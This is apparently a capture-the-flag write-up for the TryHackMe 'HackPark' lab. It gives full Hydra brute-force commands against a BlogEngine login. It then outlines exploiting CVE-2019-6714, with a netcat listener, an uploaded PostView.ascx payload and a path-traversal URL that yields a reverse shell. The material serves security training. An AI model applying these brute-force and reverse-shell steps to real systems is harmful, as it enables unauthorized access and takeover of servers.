# HackPark Writeup

## Brute forcing Hydra
### If we navigate to the home page of our server, we are greeted by pennywise. When we press the hamburger icon, we get several options. With one of them being a login. Let's try that since our first task is using hydra to brute force logins. We are redirected to http://10.10.93.133/Account/login.aspx?ReturnURL=/admin/

### We can probably assume that the username will be admin. Actually, the first hint tells us that the username is admin. This makes bruteforcing exponentially quicker. This just saves us time, and doesn't necessarily make it any "easier" besides the time saving

### Let's log in with dummy credentials in order to capture all the arguments needed to brute force the credentials. If on firefox or chrome, enter CTRL + SHIFT + I before loggin in and go to the network tab.

### We notice 5 arguments. __VIEWSTATE, __EVENTVALIDATION, ctl00$MainContent$LoginUser$UserName, ctl00$MainContent$LoginUser$Password, ctl00$MainContent$LoginUser$LoginButton

### The first command I tried was
    - hydra -l admin -P ~/tools/rockyou.txt 10.10.181.8 http-post-form "/Account/login.aspx?ReturnURL=/admin/:ctl00$MainContent$LoginUser$UserName=^USER^&ctl00$MainContent$LoginUser$Password=^PASS^:Login failed"

### The reason I used this command is because in the past, I've only supplied the needed arguments for username and password. This didn't end up working, so that means that we should provide all of them.

### Second attempt
    - hydra -l admin -P ~/tools/rockyou.txt 10.10.181.1 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=ui7RM+iCE/bA9tKgBRfSyvpJRrJB7rfbtDJpI6UQ0h/42i8IvpDN3eq2b4X2xQ2R1YrU5PqyCFDxvaNTuwywGOto9GR/3UXWxNbl11VdpVHLi341sXVpPS5jgXimCXrSAotLIWWVOLMJxivhc2fuOnExZsgNFvHaUa2IZnUyqT6lTyyH&__EVENTVALIDATION=dGipPwMco9K5lkf29xxO1eYf4QamuLuzfGG86zE6HRAuJXN9kLwfQlzuaNf+BJM1AIW2zZi+n/jrPet2mlWhiZLYbInUPAodO9AEBjKk/6BYJ5VAv/b+0q9xGclIpOKJCNlEFMx7/eST0NJojOLC1ERu4Hpl3av1LG/e27hsFxPYNYIe&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

### This also didn't work! What gives? I was still getting false positives. Hydra was saying that all of its attempts were validating successfully. Then, I noticed that the arguments have odd characters. I decided to URL encode some of the funny characters that may be interfering with hydra. Third command: 
    - hydra -l admin -P ~/tools/rockyou.txt 10.10.93.133 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=3EP3vq6ynCC%2BE2JG9iaGIoJZyPvN41%2F9zSa0wgYGz4gr5yPADn9jWDB7J4yc54GZo3YTMCYihMgzZhq9pKzc22P%2BSeemeG%2FDlcE2Np77klkiMfquzAi%2Fuy%2BFWSBbcue4M6tl2DgSfaivwJ%2Bcz1ZP9B32F7KFBez%2Fr2NyBmhf0sGrR7Bh&__EVENTVALIDATION=qIukz%2FR5nG%2BOeg%2FfrsSEVkCV3vbeypnKdVNDu%2BIeH4hsrVuWXsY%2Beuf1CuioNkL%2FSC%2BbtWhtOU1oFlHM1NUDWbHJG6%2BakIxwSo9uhouIPOEEeOhHo2gsSfps201WU3t9McMmZSDxANysNPV6tBdaxEZnuFefLt9Dq8UwKRfNtc9frwDX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

### Success finally! We got the credentials and we can login to the admin portal.

### Once we log in, we can see that Blog Engine v3.3.6.0 is running. We search exploit db, and we see that we have a LFI + RCE vulnerabilty with CVE-2019-6714. This script is located at: https://www.exploit-db.com/exploits/46353. The instructions mention that all we need for this to work is to 
1. Set up a netcast listener. Command: 
    - nc -lvnp 4445
2. Download the file and edit the method to point to your ip connected to the tryhackme vpn.
3. Edit the post. Click on the icon with the open folder to uplooad this document. Ensure it is titled PostView.ascx. 
4. Navigate to http://10.10.93.133/?theme=../../App_Data/files
5. You should have received a connection and now have a reverse shell!